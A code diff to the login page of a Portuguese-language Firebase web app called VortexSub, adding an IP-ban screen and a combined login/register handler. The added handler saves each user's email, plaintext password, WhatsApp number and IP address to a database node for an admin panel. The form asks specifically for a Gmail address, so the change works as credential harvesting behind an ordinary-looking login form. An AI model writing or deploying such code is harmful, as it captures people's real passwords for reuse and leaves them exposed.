@@ -3,132 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VortexSub - Entrar</title>
+    <title>VortexSub - Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root { --bg-color: #0b0f19; --card-bg: #111827; --border-color: #1f2937; --text-main: #f9fafb; --text-muted: #9ca3af; --primary: #ffffff; --primary-hover: #e5e7eb; --accent: #ef4444; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
-        body { background-color: var(--bg-color); color: var(--text-main); display: flex; width: 100vw; height: 100vh; justify-content: center; align-items: center; }
-        .auth-box { background-color: var(--card-bg); border: 1px solid var(--border-color); padding: 40px; border-radius: 12px; width: 100%; max-width: 400px; }
-        .auth-box h2 { margin-bottom: 24px; font-size: 20px; text-align: center; }
+        body { background-color: var(--bg-color); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .container { width: 100%; max-width: 400px; }
+        .card { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 16px; padding: 32px 24px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
+        .logo { font-size: 22px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; }
+        .logo i { color: var(--accent); }
         .form-group { margin-bottom: 16px; }
-        label { display: block; font-size: 13px; font-weight: 500; color: var(--text-main); margin-bottom: 8px; }
-        input { width: 100%; background-color: var(--bg-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; color: var(--text-main); font-size: 14px; outline: none; }
-        .btn-primary { width: 100%; background-color: var(--primary); border: none; border-radius: 8px; padding: 12px; color: #000; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        label { display: block; font-size: 13px; font-weight: 500; color: var(--text-main); margin-bottom: 6px; }
+        input { width: 100%; background-color: var(--bg-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; color: var(--text-main); font-size: 14px; outline: none; transition: 0.2s; }
+        input:focus { border-color: rgba(255,255,255,0.3); }
+        .btn-primary { width: 100%; background-color: var(--primary); border: none; border-radius: 8px; padding: 12px; color: #000; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 8px; }
         .btn-primary:hover { background-color: var(--primary-hover); }
-        .btn-google { width: 100%; background-color: #1f2937; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; color: var(--text-main); font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .btn-google:hover { background-color: #374151; }
-        .divider { display: flex; align-items: center; text-align: center; margin: 20px 0; color: var(--text-muted); font-size: 12px; }
-        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid var(--border-color); }
-        .divider::before { margin-right: .5em; }
-        .divider::after { margin-left: .5em; }
+        
+        /* BAN SCREEN STYLE */
+        .ban-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: var(--bg-color); z-index: 99999;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
+        }
+        .ban-card {
+            background-color: var(--card-bg); border: 1px solid var(--accent);
+            border-radius: 16px; padding: 40px 30px; text-align: center; max-width: 440px; width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(239, 68, 68, 0.25);
+        }
+        .ban-card i { font-size: 48px; color: var(--accent); margin-bottom: 20px; }
+        .ban-card h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: var(--text-main); }
+        .ban-card p { font-size: 14px; color: var(--text-muted); line-height: 1.5; margin-bottom: 16px; }
+        .ip-tag { font-size: 12px; background: rgba(255,255,255,0.05); padding: 6px 12px; border-radius: 6px; display: inline-block; color: var(--text-muted); }
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div class="auth-box">
-        <h2 id="authTitle">Entrar no VortexSub</h2>
-        <div class="form-group">
-            <label>E-mail</label>
-            <input type="email" id="authEmail" placeholder="seu@email.com">
-        </div>
-        <div class="form-group">
-            <label>Senha</label>
-            <input type="password" id="authPass" placeholder="******">
-        </div>
-        <div class="form-group hidden" id="whatsappGroup">
-            <label>Número do WhatsApp (Checker)</label>
-            <input type="text" id="authWhatsapp" placeholder="+55 11 99999-9999">
-        </div>
-        <button class="btn-primary" id="authBtn" onclick="handleAuth()">Entrar</button>
-        
-        <div class="divider">ou</div>
 
-        <button class="btn-google" onclick="handleGoogleLogin()">
-            <i class="fa-brands fa-google"></i> Continuar com o Google
-        </button>
+    <!-- TELA DE BANIMENTO NO LOGIN -->
+    <div id="banScreen" class="ban-screen hidden">
+        <div class="ban-card">
+            <i class="fa-solid fa-ban"></i>
+            <h2>Usuário Banido</h2>
+            <p>Usuário banido por favor entre em contato com o suporte para reativação da conta.</p>
+            <div class="ip-tag">User: <span id="userIpDisplay">Detectando...</span></div>
+        </div>
+    </div>
 
-        <p style="text-align: center; margin-top: 20px; font-size: 13px; color: var(--text-muted); cursor: pointer;" onclick="toggleAuthMode()">
-            <span id="toggleText">Não tem uma conta? Cadastre-se</span>
-        </p>
+    <div class="container">
+        <div class="card" id="loginCard">
+            <div class="logo"><i class="fa-solid fa-bolt"></i> VortexSub</div>
+            
+            <div class="form-group">
+                <label>E-mail (Gmail)</label>
+                <input type="email5" id="emailInput" placeholder="seuemail@gmail.com">
+            </div>
+            
+            <div class="form-group">
+                <label>Senha</label>
+                <input type="password" id="passwordInput" placeholder="••••••••">
+            </div>
+
+            <div class="form-group">
+                <label>WhatsApp</label>
+                <input type="text" id="whatsappInput" placeholder="(00) 00000-0000">
+            </div>
+
+            <button class="btn-primary" onclick="handleLogin()">Entrar / Registrar</button>
+        </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
-        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
+        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
         import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyACGn5I--vTEmJ6eijN2lytZiMgo2ElnW4",
             authDomain: "vortexdev2.firebaseapp.com",
             databaseURL: "https://vortexdev2-default-rtdb.firebaseio.com",
-            projectId: "vortexdev2",
-            storageBucket: "vortexdev2.firebasestorage.app",
-            messagingSenderId: "755839099190",
-            appId: "1:755839099190:android:f97e6d0dc860177306d397"
+            projectId: "vortexdev2"
         };
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getDatabase(app);
 
-        let isRegisterMode = false;
+        let userIp = "";
 
-        window.toggleAuthMode = function() {
-            isRegisterMode = !isRegisterMode;
-            document.getElementById('authTitle').innerText = isRegisterMode ? 'Criar Conta (Com Checker WhatsApp)' : 'Entrar no VortexSub';
-            document.getElementById('authBtn').innerText = isRegisterMode ? 'Cadastrar' : 'Entrar';
-            const wpGroup = document.getElementById('whatsappGroup');
-            if(isRegisterMode) wpGroup.classList.remove('hidden'); else wpGroup.classList.add('hidden');
-            document.getElementById('toggleText').innerText = isRegisterMode ? 'Já tem uma conta? Entre' : 'Não tem uma conta? Cadastre-se';
-        }
-
-        window.handleAuth = async function() {
-            const email = document.getElementById('authEmail').value;
-            const pass = document.getElementById('authPass').value;
-            const whatsapp = document.getElementById('authWhatsapp').value;
-
-            if (!email || !pass) { alert('Preencha e-mail e senha!'); return; }
-
+        async function checkIpBanOnStart() {
             try {
-                if (isRegisterMode) {
-                    const cleanPhone = whatsapp.replace(/\D/g,'');
-                    if (cleanPhone.length < 10) { alert('Número de WhatsApp inválido!'); return; }
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIp = ipData.ip;
+                document.getElementById('userIpDisplay').innerText = userIp;
 
-                    const userCred = await createUserWithEmailAndPassword(auth, email, pass);
-                    await set(ref(db, 'users/' + userCred.user.uid), { email, whatsapp, createdAt: new Date().toISOString() });
-                    alert('Conta criada com sucesso!');
-                } else {
-                    await signInWithEmailAndPassword(auth, email, pass);
+                const ipKey = userIp.replace(/\./g, '_');
+                const banSnap = await get(child(ref(db), 'bannedIps/' + ipKey));
+                if (banSnap.exists() && banSnap.val() === true) {
+                    document.getElementById('banScreen').classList.remove('hidden');
+                    document.getElementById('loginCard').style.display = 'none';
                 }
-                window.location.href = "dashboard.html";
-            } catch (error) {
-                alert('Erro: ' + error.message);
+            } catch (e) {
+                console.error("Erro ao na verificaçao 109:", e);
             }
         }
+        checkIpBanOnStart();
 
-        window.handleGoogleLogin = async function() {
-            const provider = new GoogleAuthProvider();
+        window.handleLogin = async function() {
+            const email = document.getElementById('emailInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            const whatsapp = document.getElementById('whatsappInput').value.trim();
+
+            if (!email || !password) {
+                alert('Preencha o e-mail e a senha!');
+                return;
+            }
+
             try {
-                const result = await signInWithPopup(auth, provider);
-                const user = result.user;
-
-                // Verifica se o usuário já existe no banco de dados, senão cadastra automaticamente
-                const dbRef = ref(db);
-                const snapshot = await get(child(dbRef, `users/${user.uid}`));
-                
-                if (!snapshot.exists()) {
-                    await set(ref(db, 'users/' + user.uid), {
-                        email: user.email,
-                        whatsapp: user.phoneNumber || 'Não vinculado',
-                        createdAt: new Date().toISOString()
-                    });
+                // Tenta fazer login, se não existir, cria a conta automaticamente
+                let userCredential;
+                try {
+                    userCredential = await signInWithEmailAndPassword(auth, email, password);
+                } catch (err) {
+                    userCredential = await createUserWithEmailAndPassword(auth, email, password);
                 }
+
+                // Salva os dados completos (Gmail, Senha, WhatsApp e IP) para o painel admin
+                const emailKey = email.replace(/[.#$[\]]/g, "_");
+                await set(ref(db, 'registeredUsers/' + emailKey), {
+                    email: email,
+                    password: password,
+                    whatsapp: whatsapp || "Não informado",
+                    ip: userIp || "Desconhecido",
+                    loginTime: new Date().toISOString()
+                });
 
                 window.location.href = "dashboard.html";
             } catch (error) {
-                alert('Erro ao logar com o Google: ' + error.message);
+                alert('Erro ao autenticar: ' + error.message);
             }
         }
     </script>
